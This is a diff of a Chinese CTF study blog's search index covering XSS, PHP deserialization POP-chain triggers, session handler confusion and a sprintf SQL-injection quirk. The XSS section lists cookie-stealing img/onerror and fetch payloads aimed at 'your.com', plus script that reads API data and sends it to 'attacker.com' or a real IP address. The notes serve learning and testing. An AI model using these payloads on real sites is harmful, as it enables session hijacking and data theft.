class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr2.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;https://attacker.com/post&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">    xhr2.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-POST请求外带"><a href="#2-POST请求外带" class="headerlink" title="2.POST请求外带:"></a>2.POST请求外带:</h3><p>GET外带：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. POST请求读取目标接口内容</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api/?page=1&amp;limit=10&#x27;</span>, <span class="literal">false</span>); </span><br><span class="line">xhr.<span class="title function_ invoke__">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;a=1&amp;b=2&#x27;</span>); </span><br><span class="line"><span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = xhr.responseText;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Image</span>().src = <span class="string">&#x27;http://139.224.54.229/xss_demo/get_re.php?data=&#x27;</span> + <span class="title function_ invoke__">encodeURIComponent</span>(t.<span class="title function_ invoke__">slice</span>(<span class="number">0</span>, <span class="number">2000</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POST外带:</p>
+<h1 id="利用手法"><a href="#利用手法" class="headerlink" title="利用手法:"></a>利用手法:</h1><h2 id="1-xss原理的分析"><a href="#1-xss原理的分析" class="headerlink" title="1.xss原理的分析:"></a>1.xss原理的分析:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">向网站注入恶意JavaScript代码，让别人的浏览器在受信任的网页上下文中“执行攻击者的脚本”。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-检测方式"><a href="#2-检测方式" class="headerlink" title="2. 检测方式:"></a>2. 检测方式:</h2><table>
 <thead>
 <tr>
-<th>权限类型</th>
-<th>命令</th>
-<th>说明</th>
+<th>场景&#x2F;说明</th>
+<th>Payload示例</th>
+<th>备注&#x2F;实战效果</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>更改所有者</td>
-<td><code>chown 用户名 文件/目录</code></td>
-<td>改为该用户拥有文件</td>
+<td>经典弹窗</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>判断能否插入原生JS</td>
 </tr>
 <tr>
-<td>更改权限</td>
-<td><code>chmod</code> 命令</td>
-<td><code>rwx</code> 权限设置（读&#x2F;写&#x2F;执行）</td>
+<td>双引号闭合</td>
+<td><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>用于参数被包在引号里</td>
 </tr>
 <tr>
-<td>加入组</td>
-<td><code>usermod -aG 组名 用户</code></td>
-<td>加用户到指定用户组</td>
+<td>单引号闭合</td>
+<td><code>&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>同上</td>
 </tr>
 <tr>
-<td>设置 ACL</td>
-<td><code>setfacl -m</code></td>
-<td>精细设置用户&#x2F;组的访问权限</td>
+<td>img标签onerror</td>
+<td><code>&lt;img src=1 onerror=alert(1)&gt;</code></td>
+<td>绕过部分过滤，低版本IE必弹窗</td>
+</tr>
+<tr>
+<td>svg标签onload</td>
+<td><code>&lt;svg/onload=alert(1)&gt;</code></td>
+<td>对svg支持较弱站点，能绕标签限制</td>
+</tr>
+<tr>
+<td>body标签onload</td>
+<td><code>&lt;body onload=alert(1)&gt;</code></td>
+<td>HTML主体注入点</td>
+</tr>
+<tr>
+<td>input标签onfocus</td>
+<td><code>&lt;input autofocus onfocus=alert(1)&gt;</code></td>
+<td>页面插入input时测试</td>
+</tr>
+<tr>
+<td>a标签onclick</td>
+<td><code>&lt;a href=&quot;#&quot; onclick=alert(1)&gt;点我&lt;/a&gt;</code></td>
+<td>需用户操作</td>
+</tr>
+<tr>
+<td>script块注入</td>
+<td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>封闭script后再注入新的</td>
+</tr>
+<tr>
+<td>js事件属性（万能型）</td>
+<td><code>&lt;button onmouseover=alert(1)&gt;XSS&lt;/button&gt;</code></td>
+<td>鼠标事件型绕过</td>
+</tr>
+<tr>
+<td>html注释穿插</td>
+<td><code>&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</code></td>
+<td>盲测注释处理不严的模板</td>
+</tr>
+<tr>
+<td>盲打型payload</td>
+<td><code>&lt;img src=1 onerror=fetch(&#39;//你的域名/log?c=&#39;+document.cookie)&gt;</code></td>
+<td>无回显场景，后台日志收集</td>
+</tr>
+<tr>
+<td>反射测试</td>
+<td><code>&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;</code></td>
+<td>方便区分当前站点</td>
+</tr>
+<tr>
+<td>DOM型测试</td>
+<td><code>#&quot;&gt;&lt;script&gt;alert(document.location)&lt;/script&gt;</code></td>
+<td>DOM拼接位置必测</td>
+</tr>
+<tr>
+<td>href&#x2F;jump跳转型</td>
+<td><code>javascript:alert(1)</code></td>
+<td>测url跳转、链接、按钮</td>
 </tr>
 </tbody></table>
-<h3 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限;"></a>查看用户权限;</h3><table>
+<h2 id="3-常见img回流"><a href="#3-常见img回流" class="headerlink" title="3.常见img回流:"></a>3.常见img回流:</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1.分类:"></a>1.分类:</h3><table>
 <thead>
 <tr>
-<th>命令</th>
-<th>用途</th>
-<th>示例</th>
-<th>输出解释</th>
+<th>场景&#x2F;目的</th>
+<th>payload示例</th>
+<th>说明&#x2F;攻防技巧</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>whoami</code></td>
-<td>查看当前用户名</td>
-<td><code>whoami</code></td>
-<td>如：<code>alice</code></td>
+<td>标准最常用</td>
+<td><code>&lt;img src=&quot;http://your.com/xss.php?cookie=&quot;+document.cookie&gt;</code></td>
+<td>简单直观，很多场景可用</td>
 </tr>
 <tr>
-<td><code>id</code></td>
-<td>查看 UID、GID、所属组</td>
-<td><code>id</code></td>
-<td><code>uid=1001(alice) gid=1001(alice) groups=1001(alice),100(users)</code></td>
+<td>利用onerror事件</td>
+<td><code>&lt;img src=1 onerror=&quot;new Image().src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
+<td>兼容性强，可防止部分src过滤</td>
 </tr>
 <tr>
-<td><code>groups</code></td>
-<td>显示所属的所有组</td>
-<td><code>groups</code></td>
-<td>如：<code>alice users</code></td>
+<td>onerror多参数</td>
+<td><code>&lt;img src=x onerror=&quot;this.src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
+<td>利用自身src属性，无需new对象</td>
 </tr>
 <tr>
-<td><code>echo $PATH</code></td>
-<td>查看命令搜索路径</td>
-<td><code>echo $PATH</code></td>
-<td>可执行命令所在目录</td>
+<td>base64绕过</td>
+<td><code>&lt;img src=1 onerror=&quot;new Image().src=atob(&#39;aHR0cDovL3lvdXIuY29tL3hzcw==&#39;)+document.cookie&quot;&gt;</code></td>
+<td>避免明文URL被过滤</td>
 </tr>
 <tr>
-<td><code>ls -l /路径/文件</code></td>
-<td>查看文件权限</td>
-<td><code>ls -l /etc/passwd</code></td>
-<td><code>-rw-r--r--</code> 表示所有人可读</td>
+<td>多事件联合</td>
+<td><code>&lt;img src=1 onerror=&quot;document.body.appendChild(new Image()).src=&#39;http://your.com/xss.php?cookie=&#39;+document.cookie&quot;&gt;</code></td>
+<td>兼容部分内联过滤</td>
 </tr>
 <tr>
-<td><code>namei -l /路径/文件</code></td>
-<td>逐级查看路径权限</td>
-<td><code>namei -l /etc/passwd</code></td>
-<td>检查某级目录权限是否阻断</td>
+<td>利用fetch</td>
+<td><code>&lt;img src=1 onerror=&quot;fetch(&#39;http://your.com/xss.php?cookie=&#39;+document.cookie)&quot;&gt;</code></td>
+<td>某些现代浏览器可用</td>
 </tr>
 <tr>
-<td><code>getfacl /路径/文件</code></td>
-<td>查看文件的 ACL 权限（如果启用）</td>
-<td><code>getfacl myfile</code></td>
-<td>显示具体用户的附加权限</td>
+<td>伪装UA等信息回流</td>
+<td><code>&lt;img src=&quot;http://your.com/xss.php?info=&quot;+navigator.userAgent+document.cookie&gt;</code></td>
+<td>携带更多信息</td>
 </tr>
 <tr>
-<td><code>test -x 命令路径</code></td>
-<td>判断某程序是否可执行</td>
-<td><code>test -x /usr/bin/python3 &amp;&amp; echo &quot;可执行&quot;</code></td>
-<td>返回 “可执行” 或 “不可执行”</td>
-</tr>
-<tr>
-<td>&#96;cat &#x2F;etc&#x2F;passwd</td>
-<td>grep ^$(whoami)&#96;</td>
-<td>查看当前用户的 shell、主目录等</td>
-<td>&#96;cat &#x2F;etc&#x2F;passwd</td>
+<td>GET+POST联合</td>
+<td><code>&lt;img src=1 onerror=&quot;var i=new Image();i.src=&#39;http://your.com/xss.php?c=&#39;+document.cookie&quot;&gt;</code></td>
+<td>多种变量名，规避WAF</td>
 </tr>
 </tbody></table>
-<table>
+<h3 id="2-区别"><a href="#2-区别" class="headerlink" title="2.区别:"></a>2.区别:</h3><table>
 <thead>
 <tr>
-<th>段位</th>
-<th>字符</th>
-<th>含义</th>
+<th>payload类型</th>
+<th>隐蔽性</th>
+<th>兼容性</th>
+<th>是否跳转</th>
+<th>攻防用途</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>文件类型</td>
-<td><code>-</code></td>
-<td>普通文件（<code>d</code> 是目录，<code>l</code> 是符号链接）</td>
+<td>img+src</td>
+<td>高</td>
+<td>很高</td>
+<td>否</td>
+<td>首选，适合所有场景</td>
 </tr>
 <tr>
-<td>所属用户权限</td>
-<td><code>rw-</code></td>
-<td><strong>root</strong> 用户：可读、可写</td>
+<td>img+onerror</td>
+<td>很高</td>
+<td>极高</td>
+<td>否</td>
+<td>绕过滤</td>
 </tr>
 <tr>
-<td>所属组权限</td>
-<td><code>r--</code></td>
-<td><strong>root</strong> 组：可读（但不可写或执行）</td>
+<td>location.href</td>
+<td>低</td>
+<td>高</td>
+<td>是</td>
+<td>测试&#x2F;盲打为主</td>
 </tr>
 <tr>
-<td>其他用户权限</td>
-<td><code>r--</code></td>
-<td>所有其他用户：可读（不可写或执行）</td>
+<td>fetch&#x2F;xmlhttp</td>
+<td>中</td>
+<td>中高</td>
+<td>否</td>
+<td>现代浏览器为主</td>
 </tr>
 </tbody></table>
 ]]></content>
       <categories>
-        <category>linxu</category>
+        <category>web学习</category>
       </categories>
       <tags>
-        <tag>语言学习</tag>
-        <tag>linxu命令</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>反序列化</title>
+    <url>/2025/06/02/ctfshow/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="常识"><a href="#常识" class="headerlink" title="常识:"></a>常识:</h1><h2 id="1-各类魔术方法"><a href="#1-各类魔术方法" class="headerlink" title="1.各类魔术方法:"></a>1.各类魔术方法:</h2><table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>触发时机</th>
+<th>典型用途</th>
+<th>攻击&#x2F;利用常见点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>__construct()</code></td>
+<td>实例化对象时</td>
+<td>初始化对象属性</td>
+<td>一般不用于攻击，但可配合伪类实现替代类注入</td>
+</tr>
+<tr>
+<td><code>__destruct()</code></td>
+<td>对象销毁时（GC &#x2F; 程序结束）</td>
+<td>资源释放、日志等</td>
+<td>✅常见反序列化POP链触发点，可执行恶意逻辑（如 system）</td>
+</tr>
+<tr>
+<td><code>__call($method, $args)</code></td>
+<td>调用不存在的对象方法</td>
+<td>动态路由、代理调用</td>
+<td>✅ 可结合参数污染触发函数劫持</td>
+</tr>
+<tr>
+<td><code>__callStatic($method, $args)</code></td>
+<td>调用不存在的静态方法</td>
+<td>同上，静态版</td>
+<td>✅ 框架中常被用作绕过点</td>
+</tr>
+<tr>
+<td><code>__get($name)</code></td>
+<td>读取不存在&#x2F;不可见属性</td>
+<td>延迟加载、动态代理</td>
+<td>✅ 常配合属性污染用于变量值劫持</td>
+</tr>
+<tr>
+<td><code>__set($name, $value)</code></td>
+<td>写入不存在&#x2F;不可见属性</td>
+<td>数据保护、日志等</td>
+<td>⚠️ 可用于伪造属性影响程序流</td>
+</tr>
+<tr>
+<td><code>__isset($name)</code></td>
+<td>使用 isset() 检测不存在属性时</td>
+<td>判断状态</td>
+<td>⚠️ 可辅助触发条件</td>
+</tr>
+<tr>
+<td><code>__unset($name)</code></td>
+<td>使用 unset() 删除不存在属性时</td>
+<td>自定义清理</td>
+<td>⚠️ 辅助</td>
+</tr>
+<tr>
+<td><code>__sleep()</code></td>
+<td><code>serialize()</code> 时触发</td>
+<td>控制哪些属性被序列化</td>
+<td>✅ 可精简 payload，绕过属性检测</td>
+</tr>
+<tr>
+<td><code>__wakeup()</code></td>
+<td><code>unserialize()</code> 时触发</td>
+<td>恢复连接、状态</td>
+<td>✅ 反序列化利用链典型入口点</td>
+</tr>
+<tr>
+<td><code>__unserialize($data)</code></td>
+<td>PHP 7.4+ <code>unserialize()</code> 时触发</td>
+<td>替代 <code>__wakeup</code></td>
+<td>✅ 新POP链构造点，精准控制反序列化行为</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>对象被当作字符串用时</td>
+<td>模拟字符串对象</td>
+<td>✅ CTF绕过，如 <code>echo $obj</code> → 触发命令执行</td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
+<td>对象被当作函数调用时</td>
+<td>匿名函数、执行器</td>
+<td>✅ 动态代码执行链中使用</td>
+</tr>
+<tr>
+<td><code>__set_state($array)</code></td>
+<td><code>var_export()</code> 导出再 <code>eval()</code> 恢复时触发</td>
+<td>配置类导出导入</td>
+<td>⚠️ 低频使用，静态类构建</td>
+</tr>
+<tr>
+<td><code>__debugInfo()</code></td>
+<td><code>var_dump()</code> 时触发</td>
+<td>自定义调试输出</td>
+<td>⚠️ 安全性低，但可用于信息泄露场景</td>
+</tr>
+<tr>
+<td><code>__clone()</code></td>
+<td>使用 <code>clone</code> 关键字时触发</td>
+<td>深复制定制化</td>
+<td>⚠️ 辅助构造链，不是主攻点</td>
+</tr>
+</tbody></table>
+<h3 id="利用优先级"><a href="#利用优先级" class="headerlink" title="利用优先级:"></a>利用优先级:</h3><table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>魔术方法</th>
+<th>利用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>🥇 必备</td>
+<td><code>__destruct</code>, <code>__wakeup</code>, <code>__unserialize</code>, <code>__toString</code></td>
+<td>关键触发点，常用于反序列化+代码执行</td>
+</tr>
+<tr>
+<td>🥈 常用</td>
+<td><code>__call</code>, <code>__get</code>, <code>__set</code>, <code>__invoke</code></td>
+<td>控制流中用于中转跳板，劫持参数、动态执行</td>
+</tr>
+<tr>
+<td>🥉 次要</td>
+<td><code>__sleep</code>, <code>__callStatic</code>, <code>__set_state</code>, <code>__clone</code></td>
+<td>配合使用，精细控制链构造、执行流程</td>
+</tr>
+<tr>
+<td>⚠️ 罕见</td>
+<td><code>__isset</code>, <code>__unset</code>, <code>__debugInfo</code></td>
+<td>辅助性质，信息泄露或条件判断中用到</td>
+</tr>
+</tbody></table>
+<h1 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法:"></a>基础用法:</h1><h2 id="1-哪些是可以被反序列化出来的值"><a href="#1-哪些是可以被反序列化出来的值" class="headerlink" title="1.哪些是可以被反序列化出来的值:"></a>1.哪些是可以被反序列化出来的值:</h2><table>
+<thead>
+<tr>
+<th>数据类型</th>
+<th>可否反序列化</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>O:</code> 对象</td>
+<td>✅ 是</td>
+<td>能反序列化为类对象，前提是类存在或实现了 <code>__autoload()</code> &#x2F; <code>spl_autoload_register()</code></td>
+</tr>
+<tr>
+<td><code>a:</code> 数组</td>
+<td>✅ 是</td>
+<td>支持关联数组、索引数组</td>
+</tr>
+<tr>
+<td><code>s:</code> 字符串</td>
+<td>✅ 是</td>
+<td>普通字符串可直接还原</td>
+</tr>
+<tr>
+<td><code>i:</code> 整数</td>
+<td>✅ 是</td>
+<td>会转回 PHP 中的整数类型</td>
+</tr>
+<tr>
+<td><code>d:</code> 浮点数</td>
+<td>✅ 是</td>
+<td>会被还原为 float 类型</td>
+</tr>
+<tr>
+<td><code>b:</code> 布尔值</td>
+<td>✅ 是</td>
+<td><code>b:0;</code> 为 false，<code>b:1;</code> 为 true</td>
+</tr>
+<tr>
+<td><code>N;</code> null</td>
+<td>✅ 是</td>
+<td>被还原为 <code>NULL</code></td>
+</tr>
+<tr>
+<td><code>r:</code> &amp; <code>R:</code> 引用</td>
+<td>✅ 是</td>
+<td>用于同一变量多次引用，特殊情况使用，较少见</td>
+</tr>
+<tr>
+<td><code>C:</code> 自定义序列化对象</td>
+<td>✅ 是</td>
+<td>需要类实现了 <code>Serializable</code> 接口</td>
+</tr>
+<tr>
+<td><code>E:</code> 异常对象</td>
+<td>⛔ 否</td>
+<td><code>Exception</code> 等无法序列化传递再恢复成可用异常对象</td>
+</tr>
+<tr>
+<td>资源类型</td>
+<td>⛔ 否</td>
+<td>如文件句柄等，<code>fopen()</code> 的结果不可序列化</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>漏洞点</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>类存在但未正确限制 <code>__wakeup()</code>、<code>__destruct()</code>、<code>__toString()</code>、<code>__call()</code> 等魔术方法</td>
+<td>可能造成<strong>命令执行、文件操作、SQL注入等利用</strong></td>
+</tr>
+<tr>
+<td>存在 <code>Serializable</code> 接口但处理不严谨</td>
+<td>可控制反序列化过程中的内容，伪造内部逻辑</td>
+</tr>
+<tr>
+<td>存在 <code>__autoload</code> 或自动加载机制</td>
+<td>可通过构造类名配合 phar 包等技巧，实现远程加载</td>
+</tr>
+<tr>
+<td>反序列化过程中触发数据库、文件、系统函数</td>
+<td>可造成 <strong>POP链</strong>（Property-Oriented Programming）攻击</td>
+</tr>
+</tbody></table>
+<h2 id="2-X-Forwarded-For请求头："><a href="#2-X-Forwarded-For请求头：" class="headerlink" title="2.X-Forwarded-For请求头："></a>2.X-Forwarded-For请求头：</h2><p><strong>不属于某个编程语言特有的头部</strong>，它是一个 <strong>HTTP协议层的请求头（Header）</strong>，<strong>与语言无关</strong></p>
+<table>
+<thead>
+<tr>
+<th>语言&#x2F;框架</th>
+<th>使用方式</th>
+<th>获取真实 IP 的方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PHP</strong></td>
+<td><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code></td>
+<td>或搭配 <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 使用</td>
+</tr>
+<tr>
+<td><strong>Python（Flask&#x2F;Django）</strong></td>
+<td><code>request.headers.get(&#39;X-Forwarded-For&#39;)</code></td>
+<td>默认 <code>request.remote_addr</code> 是代理地址</td>
+</tr>
+<tr>
+<td><strong>Node.js (Express)</strong></td>
+<td><code>req.headers[&#39;x-forwarded-for&#39;]</code></td>
+<td>或 <code>req.ip</code>（需设置 <code>trust proxy</code>）</td>
+</tr>
+<tr>
+<td><strong>Java (Spring Boot)</strong></td>
+<td><code>request.getHeader(&quot;X-Forwarded-For&quot;)</code></td>
+<td>配合 <code>RemoteAddrFilter</code> 使用</td>
+</tr>
+<tr>
+<td><strong>Go (Gin&#x2F;Echo)</strong></td>
+<td><code>c.Request.Header.Get(&quot;X-Forwarded-For&quot;)</code></td>
+<td>原始IP识别</td>
+</tr>
+<tr>
+<td><strong>Nginx &#x2F; Apache（Web服务器）</strong></td>
+<td><code>real_ip_header X-Forwarded-For;</code></td>
+<td>可用于替换 <code>REMOTE_ADDR</code></td>
+</tr>
+<tr>
+<td><strong>Ruby on Rails</strong></td>
+<td><code>request.headers[&quot;X-Forwarded-For&quot;]</code></td>
+<td>也可用 <code>request.remote_ip</code></td>
+</tr>
+<tr>
+<td><strong>ASP.NET</strong></td>
+<td><code>Request.Headers[&quot;X-Forwarded-For&quot;]</code></td>
+<td>常用于云服务中恢复用户IP</td>
+</tr>
+</tbody></table>
+<h2 id="3-php原生类"><a href="#3-php原生类" class="headerlink" title="3.php原生类:"></a>3.php原生类:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当调用一个不存在的方法会触发__call魔术方法，可以通过想哪一些原生类中存在__call魔术方法，再重写魔术方法就行了</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-常见含-call魔术方法的原生类"><a href="#1-常见含-call魔术方法的原生类" class="headerlink" title="1.常见含__call魔术方法的原生类:"></a>1.常见含__call魔术方法的原生类:</h3><table>
+<thead>
+<tr>
+<th>类名</th>
+<th>来源</th>
+<th>是否原生</th>
+<th>利用意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SoapClient</code></td>
+<td>PHP 扩展 <code>soap</code></td>
+<td>✅ 是</td>
+<td>任意方法调用时触发 __call，可造成代码逻辑分流</td>
+</tr>
+<tr>
+<td><code>Phar</code></td>
+<td>PHP 扩展 <code>phar</code></td>
+<td>✅ 是</td>
+<td>存在 <code>__call</code>，配合文件操作可能形成 phar POP 链</td>
+</tr>
+<tr>
+<td><code>SQLite3</code></td>
+<td>扩展 <code>sqlite3</code></td>
+<td>✅ 是</td>
+<td>当调用不存在函数（函数未定义）时触发 __call</td>
+</tr>
+<tr>
+<td><code>GMP</code></td>
+<td>PHP 扩展 <code>gmp</code></td>
+<td>✅ 是</td>
+<td>虽有实现但较难用于利用</td>
+</tr>
+<tr>
+<td><code>DateTimeImmutable</code></td>
+<td>PHP 核心</td>
+<td>✅ 是</td>
+<td>存在魔术方法组合，但利用性较低</td>
+</tr>
+<tr>
+<td><code>ReflectionFunctionAbstract</code></td>
+<td>PHP 核心</td>
+<td>✅ 是</td>
+<td>某些版本中有魔术方法，但易失效</td>
+</tr>
+<tr>
+<td><code>PDO</code></td>
+<td>PHP 核心</td>
+<td>✅ 是</td>
+<td>某些子类有 <code>__call</code>（如通过驱动动态方法绑定）</td>
+</tr>
+<tr>
+<td><code>DirectoryIterator</code></td>
+<td>SPL</td>
+<td>✅ 是</td>
+<td>间接触发可能存在于迭代器组合中</td>
+</tr>
+<tr>
+<td><code>MongoDB\Driver\Manager</code></td>
+<td>MongoDB 扩展</td>
+<td>✅ 是</td>
+<td>某些调用未定义方法可触发 __call</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查询原生类的方法;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="variable">$magicMethods</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="comment">// &#x27;__destruct&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__toString&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__wakeup&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">    <span class="comment">// &#x27;__callStatic&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__get&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__isset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__unset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__invoke&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set_state&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$magicMethods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$class</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-字符串溢出"><a href="#4-字符串溢出" class="headerlink" title="4.字符串溢出:"></a>4.字符串溢出:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在反序列化之后&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;，如果能做到这样，那么在第一个&#125;之后的数据会忽视</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5-session反序列化漏洞："><a href="#5-session反序列化漏洞：" class="headerlink" title="5.session反序列化漏洞："></a>5.session反序列化漏洞：</h2><h3 id="1-php处理器"><a href="#1-php处理器" class="headerlink" title="1.php处理器:"></a>1.php处理器:</h3><p>session.serialize_handler的引擎有看下面。<br>注：php_serialize是从5.5.4开始使用的。</p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>处理器名称</strong></th>
+<th align="left"><strong>存储格式</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>php</strong></td>
+<td align="left"><strong>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>php_binary</strong></td>
+<td align="left"><strong>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>php_serialize</strong></td>
+<td align="left"><strong>经过serialize()函数序列化处理的数组</strong>  php_serialize在内部简单地直接使用 serialize&#x2F;unserialize函数</td>
+</tr>
+</tbody></table>
+<p>php_serialize处理器是进行了一次php序列化，但是我们传入了一个|，在php处理器的理解是</p>
+<blockquote>
+<p>这三部分</p>
+<p>a:1:{s:7:”session”;s:37:” &#x2F;&#x2F;键名，这个是不解析的</p>
+<p>| &#x2F;&#x2F;分隔符</p>
+<p>O:1:”A”:1:{s:1:”a”;s:9:”phpinfo()”;} &#x2F;&#x2F;键值</p>
+</blockquote>
+<h3 id="2-session-start默认开启"><a href="#2-session-start默认开启" class="headerlink" title="2.session_start默认开启:"></a>2.session_start默认开启:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()，这里php的版本是<span class="number">7.3</span>.<span class="number">11</span>，所以就是默认就是<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-php地址引用"><a href="#6-php地址引用" class="headerlink" title="6.php地址引用:"></a>6.php地址引用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果需要一个值等于另一个的地址   ---&amp;$   ---&amp;取地址</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常用姿势</title>
+    <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintf函数"><a href="#1-sprintf函数" class="headerlink" title="1.sprintf函数:"></a>1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
+
+<hr>
+<hr>
